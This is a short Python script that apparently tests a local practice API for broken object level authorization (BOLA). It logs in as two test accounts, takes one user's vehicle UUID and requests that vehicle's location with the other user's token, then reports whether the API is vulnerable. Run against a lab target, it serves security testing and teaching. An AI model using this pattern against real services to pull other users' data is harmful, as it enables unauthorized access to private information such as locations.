import requests

# json with bubble's login info (email and password)
bubble_login_info = {
    "email":"bubble@gmail.com",
    "password":"Bubble123#"
}

# json with bubble2's login info (email and password)
bubble2_login_info = {
    "email":"bubble2@gmail.com",
    "password":"Bubble123#"
}

# post request to login with bubble's account
bubble_response = requests.post("http://localhost:8888/identity/api/auth/login", json=bubble_login_info)
# login status code
print("POST Bubble Login Status Code: " + str(bubble_response.status_code))

# if login was successful
if bubble_response.status_code == 200:
    # we extract the login token to use in the header and get access to endpoints with token authorization
    bubble_token = bubble_response.json()["token"] # or token = response.json().get("token")

    # create the header with the extracted login token
    headers_bubble = {
        "Authorization":"Bearer " + bubble_token
    }
    # use the token on GET requests to the dashboard (contains info about the user)
    getResponse = requests.get("http://localhost:8888/identity/api/v2/user/dashboard", headers=headers_bubble)
    print("GET Bubble Dashboard Status Code: " + str(getResponse.status_code))
    # print out the info
    print("GET Bubble Info Dashboard: " + str(getResponse.json()))
    print()
else:
    print("POST Login failed!")

# post request to login with bubble2's account
bubble2_response = requests.post("http://localhost:8888/identity/api/auth/login", json=bubble2_login_info)
print("POST Bubble2 Login Status Code: " + str(bubble2_response.status_code))

if bubble2_response.status_code == 200:
    # extract the bubble2's login token
    bubble2_token = bubble2_response.json()["token"] # or token = response.json().get("token")

    headers_bubble2 = {
        "Authorization":"Bearer " + bubble2_token
    }
    # GET request to bubble2's info
    getResponse = requests.get("http://localhost:8888/identity/api/v2/user/dashboard", headers=headers_bubble2)
    print("GET Bubble2 Dashboard Status Code: " + str(getResponse.status_code))
    # print out bubble2's info
    print("GET Bubble2 Info Dashboard: " + str(getResponse.json()))
    print()

    # GET request for the info about bubble2's vehicles (specifically the UUID) for BOLA test
    vehicles_response = requests.get("http://localhost:8888/identity/api/v2/vehicle/vehicles", headers=headers_bubble2)
    bubble2_vehicles = vehicles_response.json()
    # extract and print out UUID from the GET response
    bubble2_vehicles_uuid = bubble2_vehicles[0]["uuid"]
    print("GET Bubble2 vehicle UUID: " + str(bubble2_vehicles_uuid) + "\n")
else:
    print("POST Login failed!")

# BOLA (broken object level authorization) test: send a GET request with bubble's header (login token), but for the bubble2's vehicle info
bola_url = "http://localhost:8888/identity/api/v2/vehicle/" + bubble2_vehicles_uuid + "/location"
bola_response = requests.get(bola_url, headers=headers_bubble)
if bola_response.status_code == 200:
    print("Vulnerable!\n")
    print(bola_response.json())
else:
    print("Not vulnerable!")